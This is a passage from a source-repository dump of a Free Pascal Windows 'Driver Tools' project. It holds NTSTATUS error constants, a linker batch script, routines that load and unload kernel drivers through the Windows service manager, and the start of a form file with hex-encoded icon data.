STATUS_SVHDX_UNIT_ATTENTION_RESERVATIONS_RELEASED = NTSTATUS($C05CFF04);

//
// MessageId: STATUS_SVHDX_UNIT_ATTENTION_REGISTRATIONS_PREEMPTED
//
// MessageText:
//
// A previous operation resulted in this initiator's registrations being preempted, resulting in a Unit Attention condition.
//
STATUS_SVHDX_UNIT_ATTENTION_REGISTRATIONS_PREEMPTED = NTSTATUS($C05CFF05);

//
// MessageId: STATUS_SVHDX_UNIT_ATTENTION_OPERATING_DEFINITION_CHANGED
//
// MessageText:
//
// The data storage format of the device has changed, resulting in a Unit Attention condition.
//
STATUS_SVHDX_UNIT_ATTENTION_OPERATING_DEFINITION_CHANGED = NTSTATUS($C05CFF06);

//
// MessageId: STATUS_SVHDX_RESERVATION_CONFLICT
//
// MessageText:
//
// The current initiator is not allowed to perform the SCSI command because of a reservation conflict.
//
STATUS_SVHDX_RESERVATION_CONFLICT = NTSTATUS($C05CFF07);

//
// MessageId: STATUS_SVHDX_WRONG_FILE_TYPE
//
// MessageText:
//
// Multiple virtual machines sharing a virtual hard disk is supported only on Fixed or Dynamic VHDX format virtual hard disks.
//
STATUS_SVHDX_WRONG_FILE_TYPE     = NTSTATUS($C05CFF08);

//
// MessageId: STATUS_SVHDX_VERSION_MISMATCH
//
// MessageText:
//
// The server version does not match the requested version.
//
STATUS_SVHDX_VERSION_MISMATCH    = NTSTATUS($C05CFF09);

//
// MessageId: STATUS_VHD_SHARED
//
// MessageText:
//
// The requested operation cannot be performed on the virtual disk as it is currently used in shared mode.
//
STATUS_VHD_SHARED                = NTSTATUS($C05CFF0A);

//
// MessageId: STATUS_SVHDX_NO_INITIATOR
//
// MessageText:
//
// Invalid Shared VHDX open due to lack of initiator ID. Check for related Continuous Availability failures.
//
STATUS_SVHDX_NO_INITIATOR        = NTSTATUS($C05CFF0B);

//
// MessageId: STATUS_VHDSET_BACKING_STORAGE_NOT_FOUND
//
// MessageText:
//
// The requested operation failed due to a missing backing storage file.
//
STATUS_VHDSET_BACKING_STORAGE_NOT_FOUND = NTSTATUS($C05CFF0C);

//
// SMB status codes
//
//
// MessageId: STATUS_SMB_NO_PREAUTH_INTEGRITY_HASH_OVERLAP
//
// MessageText:
//
// Failed to negotiate a preauthentication integrity hash function.
//
STATUS_SMB_NO_PREAUTH_INTEGRITY_HASH_OVERLAP = NTSTATUS($C05D0000);

//
// MessageId: STATUS_SMB_BAD_CLUSTER_DIALECT
//
// MessageText:
//
// The current cluster functional level does not support this SMB dialect.
//
STATUS_SMB_BAD_CLUSTER_DIALECT   = NTSTATUS($C05D0001);

//
// MessageId: STATUS_SMB_GUEST_LOGON_BLOCKED
//
// MessageText:
//
// You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
//
STATUS_SMB_GUEST_LOGON_BLOCKED   = NTSTATUS($C05D0002);

//
// Embedded Security Core
//
// Reserved id values 0x0001 - 0x00FF
//                    0x8xxx
//                    0x4xxx
//
// MessageId: STATUS_SECCORE_INVALID_COMMAND
//
// MessageText:
//
// The command was not recognized by the security core
//
STATUS_SECCORE_INVALID_COMMAND   = NTSTATUS($C0E80000);

//
// Virtual Secure Mode (VSM)
//
//
// MessageId: STATUS_VSM_NOT_INITIALIZED
//
// MessageText:
//
// Virtual Secure Mode (VSM) is not initialized. The hypervisor or VSM may not be present or enabled.
//
STATUS_VSM_NOT_INITIALIZED       = NTSTATUS($C0450000);

//
// MessageId: STATUS_VSM_DMA_PROTECTION_NOT_IN_USE
//
// MessageText:
//
// The hypervisor is not protecting DMA because an IOMMU is not present or not enabled in the BIOS.
//
STATUS_VSM_DMA_PROTECTION_NOT_IN_USE = NTSTATUS($C0450001);

//
// Application Execution (AppExec)
//
//
// MessageId: STATUS_APPEXEC_CONDITION_NOT_SATISFIED
//
// MessageText:
//
// The condition supplied for the app execution request was not satisfied, so the request was not performed.
//
STATUS_APPEXEC_CONDITION_NOT_SATISFIED = NTSTATUS($C0EC0000);

//
// MessageId: STATUS_APPEXEC_HANDLE_INVALIDATED
//
// MessageText:
//
// The supplied handle has been invalidated and may not be used for the requested operation.
//
STATUS_APPEXEC_HANDLE_INVALIDATED = NTSTATUS($C0EC0001);

//
// MessageId: STATUS_APPEXEC_INVALID_HOST_GENERATION
//
// MessageText:
//
// The supplied host generation has been invalidated and may not be used for the requested operation.
//
STATUS_APPEXEC_INVALID_HOST_GENERATION = NTSTATUS($C0EC0002);

//
// MessageId: STATUS_APPEXEC_UNEXPECTED_PROCESS_REGISTRATION
//
// MessageText:
//
// An attempt to register a process failed because the target host was not in a valid state to receive process registrations.
//
STATUS_APPEXEC_UNEXPECTED_PROCESS_REGISTRATION = NTSTATUS($C0EC0003);

//
// MessageId: STATUS_APPEXEC_INVALID_HOST_STATE
//
// MessageText:
//
// The host is not in a valid state to support the execution request.
//
STATUS_APPEXEC_INVALID_HOST_STATE = NTSTATUS($C0EC0004);

//
// MessageId: STATUS_APPEXEC_NO_DONOR
//
// MessageText:
//
// The operation was not completed because a required resource donor was not found for the host.
//
STATUS_APPEXEC_NO_DONOR          = NTSTATUS($C0EC0005);

//
// MessageId: STATUS_APPEXEC_HOST_ID_MISMATCH
//
// MessageText:
//
// The operation was not completed because an unexpected host ID was encountered.
//
STATUS_APPEXEC_HOST_ID_MISMATCH  = NTSTATUS($C0EC0006);

//
// MessageId: STATUS_APPEXEC_UNKNOWN_USER
//
// MessageText:
//
// The operation was not completed because the specified user was not known to the service.
//
STATUS_APPEXEC_UNKNOWN_USER      = NTSTATUS($C0EC0007);


//
// QUIC
//

//
// MessageId: STATUS_QUIC_HANDSHAKE_FAILURE
//
// MessageText:
//
// The QUIC connection handshake failed.
//
STATUS_QUIC_HANDSHAKE_FAILURE    = NTSTATUS($C0240000);

//
// MessageId: STATUS_QUIC_VER_NEG_FAILURE
//
// MessageText:
//
// The QUIC connection failed to negotiate a compatible protocol version.
//
STATUS_QUIC_VER_NEG_FAILURE      = NTSTATUS($C0240001);


```

`source/DrvTools/src/ppas.bat`:

```bat
@echo off
SET THEFILE=C:\Work\DrvTools\DrvTools32.exe
echo Linking %THEFILE%
C:\lazarus\fpc\3.2.0\bin\x86_64-win64\ld.exe -b pei-i386 -m i386pe  --gc-sections  -s --subsystem windows --entry=_WinMainCRTStartup    -o C:\Work\DrvTools\DrvTools32.exe C:\Work\DrvTools\link.res
if errorlevel 1 goto linkend
C:\lazarus\fpc\3.2.0\bin\x86_64-win64\postw32.exe --subsystem gui --input C:\Work\DrvTools\DrvTools32.exe --stack 16777216
if errorlevel 1 goto linkend
goto end
:asmend
echo An error occurred while assembling %THEFILE%
goto end
:linkend
echo An error occurred while linking %THEFILE%
:end

```

`source/DrvTools/src/scmsup.pas`:

```pas
{*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2006 - 2021
*
*  TITLE:       scmsup.pas
*
*  VERSION:     5.51
*
*  DATE:        17 May 2021
*
*  SCM support routines for drivers load/unload.
*  ObjFPC variant
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************}
unit scmsup;

{$mode objfpc}{$H+}

interface

uses
  Windows, jwawinsvc, Classes, SysUtils;

function scmOpenManager(DesiredAccess: DWORD; var schSCManager: THANDLE;
  var lpStatus: DWORD): boolean;

function scmCloseManager(var schSCManager: THANDLE; var lpStatus: DWORD): boolean;

function scmInstallDriver(SchSCManager: SC_HANDLE; Name: LPCTSTR;
  DisplayName: LPCTSTR; StartType: DWORD; ErrorControl: DWORD;
  DriverBinary: LPCTSTR; var lpStatus: DWORD): boolean;

function scmRemoveDriver(SchSCManager: SC_HANDLE; DriverName: LPCTSTR;
  var lpStatus: DWORD): boolean;

function scmStartDriver(SchSCManager: SC_HANDLE; DriverName: LPCTSTR;
  var lpStatus: DWORD): boolean;

function scmStopDriver(SchSCManager: SC_HANDLE; DriverName: LPCTSTR;
  var lpStatus: DWORD): boolean;

implementation

{*
* scmOpenManager
*
* Purpose:
*
* Open handle for local SCM database.
*
*}
function scmOpenManager(DesiredAccess: DWORD; var schSCManager: THANDLE;
  var lpStatus: DWORD): boolean;
begin
  schSCManager := OpenSCManager(nil, nil, DesiredAccess);
  lpStatus := GetLastError();
  Result := (lpStatus = ERROR_SUCCESS);
end;

{*
* scmCloseManager
*
* Purpose:
*
* Close handle for local SCM database.
*
*}
function scmCloseManager(var schSCManager: THANDLE; var lpStatus: DWORD): boolean;
begin
  if (schSCManager <> 0) then
  begin
    if (CloseServiceHandle(schSCManager)) then
      schSCManager := 0;
    lpStatus := GetLastError();
  end
  else
  begin
    lpStatus := ERROR_INVALID_PARAMETER;
  end;
  Result := (lpStatus = ERROR_SUCCESS);
end;

{*
* scmInstallDriver
*
* Purpose:
*
* Create SCM service entry describing kernel driver.
*
*}
function scmInstallDriver(SchSCManager: SC_HANDLE; Name: LPCTSTR;
  DisplayName: LPCTSTR; StartType: DWORD; ErrorControl: DWORD;
  DriverBinary: LPCTSTR; var lpStatus: DWORD): boolean;
var
  schService: SC_HANDLE;
begin

  schService := CreateService(SchSCManager, // SCManager database
    Name, // name of service
    DisplayName, // name to display
    SERVICE_ALL_ACCESS, // desired access
    SERVICE_KERNEL_DRIVER, // service type
    StartType, // start type
    ErrorControl, // error control type
    DriverBinary, // service's binary
    nil, // no load ordering group
    nil, // no tag identifier
    nil, // no dependencies
    nil, // LocalSystem account
    nil // no password
    );

  lpStatus := GetLastError();

  if (schService <> 0) then
    CloseServiceHandle(schService);

  Result := (lpStatus = ERROR_SUCCESS);
end;

{*
* scmStartDriver
*
* Purpose:
*
* Start service, resulting in SCM drvier load.
*
*}
function scmStartDriver(SchSCManager: SC_HANDLE; DriverName: LPCTSTR;
  var lpStatus: DWORD): boolean;
var
  bResult: boolean;
  schService: SC_HANDLE;
begin
  schService := OpenService(SchSCManager, DriverName, SERVICE_ALL_ACCESS);

  lpStatus := GetLastError();

  if (schService <> 0) then
  begin
    bResult := StartService(schService, 0, nil);
    lpStatus := GetLastError();
    if (lpStatus = ERROR_SERVICE_ALREADY_RUNNING) then
    begin
      bResult := True;
      lpStatus := ERROR_SUCCESS;
    end;
    CloseServiceHandle(schService);
  end;

  Result := (bResult <> False);
end;

{*
* scmStopDriver
*
* Purpose:
*
* Command SCM to stop service, resulting in driver unload.
*
*}
function scmStopDriver(SchSCManager: SC_HANDLE; DriverName: LPCTSTR;
  var lpStatus: DWORD): boolean;
var
  bResult: boolean;
  schService: SC_HANDLE;
  iRetryCount: integer;
  serviceStatus: SERVICE_STATUS;
begin
  schService := OpenService(SchSCManager, DriverName, SERVICE_ALL_ACCESS);

  lpStatus := GetLastError();

  if (schService <> 0) then
  begin
    for iRetryCount := 5 downto 0 do
    begin

      SetLastError(ERROR_SUCCESS);

      ZeroMemory(@serviceStatus, sizeof(serviceStatus));

      bResult := ControlService(schService, SERVICE_CONTROL_STOP, serviceStatus);

      lpStatus := GetLastError();

      if (bResult <> False) then
        break;
      if (lpStatus <> ERROR_DEPENDENT_SERVICES_RUNNING) then
        break;

      Sleep(1000);

    end;
    CloseServiceHandle(schService);
  end;

  Result := (bResult <> False);
end;

{*
* scmRemoveDriver
*
* Purpose:
*
* Remove service entry from SCM database.
*
*}
function scmRemoveDriver(SchSCManager: SC_HANDLE; DriverName: LPCTSTR;
  var lpStatus: DWORD): boolean;
var
  bResult: boolean;
  schService: SC_HANDLE;
begin
  schService := OpenService(SchSCManager, DriverName, SERVICE_ALL_ACCESS);

  lpStatus := GetLastError();

  if (schService <> 0) then
  begin
    bResult := DeleteService(schService);
    lpStatus := GetLastError();
    CloseServiceHandle(schService);
  end;

  Result := (bResult <> False);
end;

{*
* scmUnloadDeviceDriver
*
* Purpose:
*
* Combines scmStopDriver and scmRemoveDriver.
*
*}
function scmUnloadDeviceDriver(DriverName: LPCTSTR; var lpStatus: DWORD): boolean;
var
  schSCManager: SC_HANDLE;
begin
  Result := False;
  lpStatus := ERROR_SUCCESS;

  if (DriverName <> nil) then
  begin
    schSCManager := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
    if (schSCManager <> 0) then
    begin
      scmStopDriver(schSCManager, DriverName, lpStatus);
      Result := scmRemoveDriver(schSCManager, DriverName, lpStatus);
      CloseServiceHandle(schSCManager);
    end;
  end
  else
  begin
    lpStatus := ERROR_INVALID_PARAMETER;
  end;

end;

{*
* scmOpenDevice
*
* Purpose:
*
* Open driver device by symbolic link.
*
*}
function scmOpenDevice(DriverName: LPCTSTR; var lpDeviceHandle: THANDLE;
  var lpStatus: DWORD): boolean;
var
  DeviceName: string;
begin
  if (DriverName <> nil) then
  begin
    try
      DeviceName := Format('\\.\%s:', [DriverName]);
    except
      Result := False;
      lpStatus := ERROR_INTERNAL_ERROR;
      exit;
    end;
    lpDeviceHandle := CreateFile(PChar(DeviceName), GENERIC_READ or
      GENERIC_WRITE, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    Result := (lpDeviceHandle <> INVALID_HANDLE_VALUE);
  end
  else
  begin
    Result := False;
    lpStatus := ERROR_INVALID_PARAMETER;
  end;
end;

{*
* scmLoadDeviceDriver
*
* Purpose:
*
* Unload if already exists, Create, Load and Open driver instance.
*
*}
function scmLoadDeviceDriver(DriverName: LPCTSTR; DisplayName: LPCTSTR;
  DriverPath: LPCTSTR; StartType: DWORD; ErrorControlType: DWORD;
  ForceReload: boolean; var lpDeviceHandle: THANDLE; var lpStatus: DWORD): boolean;
var
  schSCManager: SC_HANDLE;
begin
  Result := False;
  lpStatus := ERROR_INVALID_PARAMETER;
  lpDeviceHandle := 0;

  if (DriverName = nil) then
    exit;

  schSCManager := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  if (schSCManager <> 0) then
  begin
    if (ForceReload) then
      scmRemoveDriver(schSCManager, DriverName, lpStatus);

    if (scmInstallDriver(schSCManager, DriverName, DisplayName,
      StartType, ErrorControlType, DriverPath, lpStatus)) then
    begin
      if (scmStartDriver(schSCManager, DriverName, lpStatus)) then
      begin
        Result := scmOpenDevice(DriverName, lpDeviceHandle, lpStatus);

      end;
    end;

    CloseServiceHandle(schSCManager);

  end
  else
  begin
    lpStatus := GetLastError();
  end;
end;


end.


```

`source/DrvTools/src/unit1.lfm`:

```lfm
object MainForm: TMainForm
  Left = 406
  Height = 694
  Top = 134
  Width = 606
  AllowDropFiles = True
  Caption = 'Driver Tools'
  ClientHeight = 694
  ClientWidth = 606
  Constraints.MinHeight = 640
  Constraints.MinWidth = 480
  Icon.Data = {
    77B0000000000100040000000000010020007975000046000000303000000100
    2000A8250000BF7500002020000001002000A8100000679B0000101000000100
    2000680400000FAC000089504E470D0A1A0A0000000D49484452000001000000
    010008060000005C72A8660000754049444154789CECBD07789CC779EF1B5192
    235BF6895B9CB8C42DD7CE719C6BA7D8C7C9719C9C1C5FC7B6AA59D17BEFBDF7
    DE7B254080BDF7DE449194D87BA758C4DE44AA8B14C586EFCE6F7667B9000170
    01ECEEB700779E671E8020B0FBEDCCBCFFF9BFFDCFFECC399CC3399CC3399CC3
    396C373C3CBCBEE7E2EA3ED1DBDB37D0CDDDE3E71E9E5EFF43EF67720EE7700E
    3B8DF0F0C882A4E4342D24245CF3F4F2E97277F7BCEAE6EEB9C1DDC3ABD8D3D3
    FB153737CFBFD1FB199DC3399CC306232030F88B8545A557274F99AEB54F9AAC
    3536B56A25A5155A6A5AA6161119A3F9FA05681E1EDE77DCDC3C4E0BA6304B30
    85DFE9FDCCCEE11C4FF4C82F28FAA2B55E2B29393570FA8CD9DACC5973B4A9D3
    676A1D93A76A6DED1D5A734B9B56DFD0AC55D7D46B45C5A55A5A7A96161D13A7
    F9F8F85759EBBD9DC3399C6300233BB7F0F99CBCFC420100678B4BCBFE71A8AF
    171119F54C4555CDFE454B9669F3172CD266CF99A74D9F395B9B3C75BA36A963
    8AD63A7192640475F58D5A55759D56565EA54544449558E3B338877338878523
    2B3FFFA992B28AFF5B5C5A7EBCA9B955DBB17397B66AF5DA2BA5E5953F1FCAEB
    2625A7FF71C1C2250F56AC5AA32D5DB6425BB868893677DE426DE6ECB9DA34C1
    063A274F136CA0536B696DD31A1A5BB49ADA062D362EB1C05A9FCB399CC3391E
    335A3A267FA5BCA2BAADBAA6EECE92A5CBB5B7DE3AA19D39734E3B7BEEBCB662
    E5EA0B85C5253F1ACCEBA6A6668EAAAD6F5CB661E3666DDDFA0DDAAA35EBB465
    2B56698B251B58ACCD9E3B5F9B21D8C094A9334C6CA0A979A2969094926BE58F
    E81CCEE11C3D474B6BC7D3CD2DEDE30405BF84106EDFB14B3B7EFC8476E2C429
    EDD4A9D3DADB6F9FD1CE9E3DA72D5FB1EA6C5D5DD38041A0A0A0F8A7E26FEF6E
    D9BA5DDBB4F94DEDB5D737696BD6BDA6AD840D2C5FA92D5CBC549B3B7FA1360B
    363063963679CA3469244C4A49CFB4C5E7750EE7700EE398346DC6F75A5ADB17
    899B57D2F3BDFB0F68070F1DD10E1F39A61D3D7A5CB08093DAC993A7B4D3A7DF
    96402004F9645373DB7707F21E0D8DCD4D7BF6EDD776EDDEAB6DDBBE537B63CB
    56EDF54D6F68EB5E7B5D5B2DD8C0F295AB3518C782858BB5397317683366CDD1
    A64C9BA1A5A667A5D8EA733B87733CF163625BE72B93A74CBFC1EDBBF98D2D42
    40F768BBF7EE9320B0FFE021EDD0E1A3DA110104C78EBD25D8C049C9060082A5
    CB561E696EE9FCF6E35E3F27B760544969C55FAF59BBFE435E87D7DCB377BFB6
    63E76E6DCB36C106C47BC206D6C20656AFD5960936B048B08179F3174936909D
    93176B8F75700EE77822C7C48E292F093DBCEB8D37B76AD0F3EDE276463877ED
    D9AB7163EF3B70503B70E8B00402D8006A016C80B97CC5EA039366CCF9A67AAD
    AAEABA6F35364DFCEFFA869694DABAC64EF1EFF558FD5B5ADBCE1BFEE6B40412
    5E8BD7E53D5035DEDCB24DDB28D8C0FA0D1BB5D56BD79BD8009E82A2D2F2283D
    D7C7399C63448FE6F68EE7C5EDFF36741C0680306EDDB6430AE6CE5DDDD9C0C1
    C3474C6CE02DC10660044277DFD33AB12357A8103B0565FF443003F93A070E1C
    D24E9D3EA35DB87849CE4B972E6BE7CE9D17ECE18CFCDB23024C0E1C3C2C4186
    F7E13DF93B8C846BD76F906C60C9B2155A59794DA8DE6BE41CCE31A247C7E469
    79E8E208DFC6CD6F6A8A0D6C536C60B7910DEC3F2885D69C0DE02500340E1F39
    2A3D05E72F5CD42E5EBCAC5DBE7C55BB76ED1DED9D776E68376EBC2BBF5EB972
    55BB70E1923426A24AF0F7BCD67EC10676EFD96760035BB7C967800D0002C525
    A5817AAF8F7338C7881E4DCDED3F5AB868E91D40007DBC4F36B0C7C806C4EDAE
    8C84920D602494B68133D26578EEFC05E3AD7F4508FD350104D7B5EBD7DFD5AE
    0B200014F839BF8341112F0360829AB177DF01031BD82ED88000219E47A8110B
    73F3F2BFA3F71A3987738CE8D1DE31790DFA37F49BDBB75F36B0B73B1B386264
    03DD5D86820D0821576CE0EAD5876CE0FAF51B12182E5EBC247FEFD4A9B7E5DF
    0328800B6A07EF05002D58B8446B686CFEA8BAA63EBDA8B8E40B03F94CE99959
    9FCBCAC9FD4D6E7E61627E51D1285BAD9D7338C7B01F75F54DE308CA214007FF
    3CC13A8A0D6C32B181EDDDD9C0BEEE6CE0A86403274C2EC33367CE4ABD1FDA8F
    0DE05136705D80C31501141705689C957FC76BF07A300DE5327C7DD366192D58
    5BD7B8B7B2B2F69F1FF7590A8B4ABE555C529E50525A71B0B4ACF2414161F183
    DCBC22577BACA37338C7B01C0505255FEC9C32EDD2F215AB346201241B1040B0
    DEA8166C546A81D0D1B7098ABE430081810D18D402131B104070587CDD2DFE6F
    CDDA75DADCB9F3B5A953A76B93A74CD566CE9CAD2D112003AB802D5CB97A4D82
    C1D5ABD72453382B8D846F4B95E2704F97A16021AB56AFD5DA2675DE6C699B14
    2A84BCDB8D5E565EF59C5017FED0D4DC36AFB9A5ED26E1C48D4D2D8086565E51
    4D82D1C5BCFCC2BFD26B7D9DC3391C7E9457565790A8832F1E571C46B8350208
    D699A9059B8C6A816403662E43027BA608414F4DCBD03C3CBCB4175E78497BE9
    A557B4575F1DAD8D1D3B5E1B3FC155737575D73C3CBDB58080602D2E3E490A28
    AF77F5DA3B52354055B870E1A2640EB00193CB70BF7219EE9440347DE6EC07CD
    ADED0D4DCD939E6B6EEFF851DBA4C9D91D9D534FCE9C35D79065386D8626FEAD
    4D6C7B9865585955A309363045EF35760EE770D8919D93F7B3A9D366DE4115C0
    05B7CCC806500BCCD980B99110C6505C52A6F9F8FA6B63C68CD35C8490FBF905
    6A61E151329D372131454B49CDD0D233B2B5CCAC5C027BC4D71C99EE9B9B57C8
    8D2E68FF71EDE6CD9B2610800D9C336303478E1EEBE63284852C58B8B84BA805
    27172F5DFE29CFB86CF92A0DF09AB76091368B2C43194E3C5D6BEF986CCC3224
    B9A8FE7E4D6DE3EFF55E67E7700E871C3131314F0921D93B7FE162198D27844B
    C6E92B36B0DA8C0DE0EF2FAFA8D2C223A2B4C0C0102D28384C7C1F2D843E5E0A
    3D029E939BAF151695CAB45EF2FCC9F06B99D82E937D600BD402681654BDA2B2
    4650F506928DA40A817A80211197E2991E2EC37D7DB80C793680608929CB7081
    3673F69C6E59862417896738D1DC32E9CB7AAFB5733887C38D94D4341721B09F
    CD11C24328EE0221488B7AB00126F43A2B3B570A7B5878A4BCED23A36225AD4F
    494D97377D7E419156525A2EA9776D7DA3D6D432510A61E79469F276A6160059
    80B00D5E9BC83FEA029002CCFF21DCD818A421D1E4323CF9A8CB709BC165D87B
    96E1229965385D66191A6A0E00402D6D93CAF55E6BE7700E871AC929E9BF1282
    FB49A7B895D1A567CF992F73F5115232F5162F592E6F566E71683C028FF073EB
    C7C4266889C9A992E6E7E415C88A3EB003C126E4EF43C13B3AA748DD9C5B99BC
    035E13764136205E076E71F47B26428BDE3E4FFC1EFF7F50D0FF870144CA6578
    D4CC65B84BEB9965F8B0E68021CBD0BCE640FBA4C9F79A9A5BFF4DEF35770EE7
    7088119F90F63521C027A9C6C34D89A0909B4F32CE1C218CB00100010ACDED8E
    D0AB5B3F3E21491AFE6004F905C55A695985B8F56BB5BAFA2669806B173A3EBA
    38B730AF45B61FAA056A0559802A021157A38C37D8B153DEEC9BDFDCA2751ACB
    8561D8C3E64000917219CA00A263C7CD5C867B0C59866F3ECC32840D60A3E0FD
    E6CB2CC38735073AA74CDF3B79CAECCFEBBDF6CEE11CBA8E84848C51D1310953
    28CC49FE3D3735B9F8A4E292974F5A2EB727829891992D053F3CD270EB53D997
    5B1F635E51719974B741E101122CF0A80AD4FDE3EFB9CD17A95B7FF55A695494
    EE45BC0A5BB6CAE8BF9E494858FFA1F2000F2C62B5F83B8391D010406430129E
    E8D565D833CB70A929CBD050734080CBA7E233FE4AEFF5770EE7D075444446BF
    2C6EF0FB933A264B00404F3700C154A9932BFD59DDFC51D158F69365155F5481
    82C212DC6BB2861FB41DA31E7FCFDF70DB624F209A6F89BAF5D7AE97DE046E7D
    6EF52DE6C1457BBB871A63F463E28A844D5455D74A43A12180A83797E11183CB
    70B7C16568CA32A4E6805996A10080DBEDED93C7EBBDF6CEE11CBA0E7FFFC03F
    0F0D8B3881810E9A8ED06328438099FC0C971AD41EBA1F1B97A825A7A4092690
    A3E5E5174AF79FB2E037361B6F7D41DB512166CD9E275D728B8C463E79EB1BA3
    0BB9F5114E155EBCDB3CF558E8FBE6C2CFBF116A40002690975F2481834842C2
    8B1FBA0CCF3CE232DCB16BF7C32C43D880787FF14C3705C88DD17BED9DC3396C
    32DCDD3D7FE8E9E9FD0B1F5FDF9F050404FEBDBF7FC08FBDBC7DFFD6D72FE007
    DE3E7EDFF5F4F4F98E7F60F0B7FC0383FE3A24343C393B275F5AE5A1EADCDA18
    C950030002E872756DBDC99F8F6B2F5BBAF64AB4B2F24AADBAC670EBB7B43E74
    EDA13270EB6330C47BA0A20A31F2C9F881371FDEFAE8ED08AA29DDD84CF0F91E
    26C0FFC10C60080428D5373409D0A9D64E885BBF67962189487DBA0C05E02C5A
    BCECA3C6A689CE3E03CE31728787A7F7EB0585C592BA6375C7ED26E87D97D0E1
    EFB74C6CBFD3D4DC7ABBA1B1E5565D7DD3C735B5F5F7A648CBFC5CF9FBE8FCFC
    0D373F7E74FE0FD75E728AC1B5C7ED5B5C5A6EBCF51BE58D2C5D7B0234A6F570
    ED617C930144E2D6E5F6DDF4C8ADFF90EEE3D6A3D640CF5B5F961013EC80DFC7
    38886B10CF04EA000073D5184ADC2DCBF0DCA32E435E67E9B2151FD4D5B7FC56
    EFFD710EE7B0D970F3F07866DC38978FB172E30A4300A1DEE8CDD070DC6258C4
    3186E1E347587191611D87EA737B03040002BF97919523A3F872720B4C013DE6
    AE3D6E7DE9DA137F8760E2725B6ABCF5797F841FBD5B06E588DF41685F17BA3F
    42ADB2091F77EB737B632044F8A1F2AF0926219F71D65CF9BBE65986EF74CB32
    7CC806962E5F795D3CBFD3EDE71C237BB8BAB9FF7CC204D72E841DC3170208FD
    0608104A84111A0D35E796C6178F5B0E371FB49D1B1CE1E7FFA1F558F9D1FFF1
    1028D79E0AE891AE3D6E7D011EB8D8CC6F7D0C6D9555355D61611147DDDC3C26
    8E1FEF92ECEEEE15E5EBEB9F909A9651B962F5DAAD972F5FF9EC9891AA73FB77
    BBF5771B6F7DC116B0E8E3DA8341001ED810B0E8035AFC8CBA037D6519C20696
    2F5F79352727EF177AEF8D733887CD8710B4E0808020A96B636547EFC61F8E2B
    0C20E8C6060002231B5868C60610666EF1F4CC6C29FC0F5D7B2AA067AAB8F57B
    77EDAD5AB35606D96464E6CC090B8FFC979090B0677B7BCE4D3B778D3A79E6EC
    77C52D9DBF77EFFEF771DFED15828F5A60BAF5B7ED902A03B73E967C049FCFB3
    D6C86C78567E4E21126E7C04BE271B58B57ACDA5E292D29FD97B1F9CC3397419
    E3C64DE8CCCECE35080D37A699E01026BBE6B16C6089FC39C13BF8FC71BBD535
    A8809EC9D22D38C32CA0C7DCB5275375DB3BCF9695D7FC7F0379E6152B567F57
    00CE4AEC04BDDDFA2620333E3F40C37BAADA05A785BE2F2B105DB868AC396028
    45460E415676DECECCBCBCA76CB5DECEE11C0E333C3DBD468D1E3DF6C8C4B649
    0601DAB25502816203AFF5C6060002333680DECFCFF1ED73F31B027A0CB7BEC1
    B53757AA0BDCFACBCC027A5035042338D832B17D506DBD853EFFE713DB3A262E
    59BAC274EB9BC0CBF8CC0AB84CB60C01003C07BABED2F90D1588141BB8C667F8
    343935FDFB565E6AE7700EC71B1E1EDEDF1937DEE5263731B7A8A4D05BB73DD4
    9F7BB2013323A16203A807B000D27565404F8731A0679631A0A7A76BCF18D023
    7E7EBEBDA373408D427A8EB6B68E674A4A2BE6F3FCE6B7FE6AB35B7F9999DAC2
    73A2BA9013F0EEBBEF992A109D9515880C85492940929098E2AC04E41C237FB8
    BB7BFDDEC7C75FEAD04A8F36D169231BD868A4D4E637AB391B40F808E62929AB
    30B9F66649D7DEC3801EE5DA7BCDE8DA13ACE2C1CC59F3AC92635F5E5EF555C1
    322EAEEBE7D637D92B0420610700E8DE16827FFCAD13C6A6256724FD472D0040
    E2E2936AACF16CCE318051545CFA4C5656EECFB3B2F32BC56D52A6F7F33C09C3
    DDC333273D3D535AD171A1294B3A21B1BDB1816EBAB599B0E1E36F6E996874ED
    19027A4CAE3DB3801E5E8BD75CB976DD726B7E0E01427ED40054B7FED26EB7FE
    626978C4F3801112B7A5EA2FC8679585494FAAC2A467B5BD7BF713C4F47A4C4C
    9CD30E608F919A96F19DFCC292B8BC82A29D79F985F773F30AF021DFCFCE2DF8
    8DDECF36D2878F8FDF2A0457F9D12510ECD9DB9D0D6CDBFED0B2DE930D082040
    D8B0FC63E8EB19D0035018B2F6DE34D605DC49C24DD7C225CBFED39A9F63CBEE
    3D5F3C74E4E879DE571928513D082B460D8191100380F0F33DBF37B1BD43FE6E
    B732E502088E08F5203E21F94C4464CCE7ACF98CCE61360A0A8ABF945F5032BE
    A8A46C456151E94D02463022E517166B020864CCB8987BB3B2F30654D279380D
    5737F7E7BCBD7DFFDED5D54DB7D2D37E7E013F4D4D4D6F9F3377DE2D180061B0
    14CDE8CE060CEEB52DBDB0016837063EC27C4DB9FAABBBE7EA1B6A01EED0B6EF
    34140415A07176D1A225564FA9BD70E972ABCCE517CF815B726E8F5B9FAFFC9B
    9F0300141CC173D1B34C396090929AFE594868D817ADFD8C4FF4A8A969F89C38
    28BF292DAB6A2D2BAFBA4E0E38D55F8A4BCA655A2820C0A40C14FA23C12379F9
    45C97A3FB72D86ABABE753DE3EBEC56E6E1EF75D5DDD57B8BB7BFECED7D7F769
    BD9E272828F83B894929C51D9D53AE714B3F6403061FBB72B56DEDC106000022
    ECCA2BAB1F9BAB0FA8F09A2B56AE5E6C8BCFB07EFD064FA2195580928A5254B7
    BEAC58B4C050B108C3654D5D83CC0FE0991E962937742FCAC8C8D6FCFD03BFF9
    F877758EC78EAADA86BFADAE6BCCACACAA3D565955731F571193105152420102
    2AC11021C62D838F96248D7DE2101616977E989357F003BD3F83B5879797CF7F
    BB7B78DD1182AFB93105107878786DF5F6F69920BE3EA3D773F9FAFA7F5D0041
    4C6353CB598C802ABCB61B1BD8BEC3E47387E2530780DBD4925C7D827766CC9C
    53608B671797CBBF5756D776996EFD99DD6F7D55B310DB00864B1284609ABD75
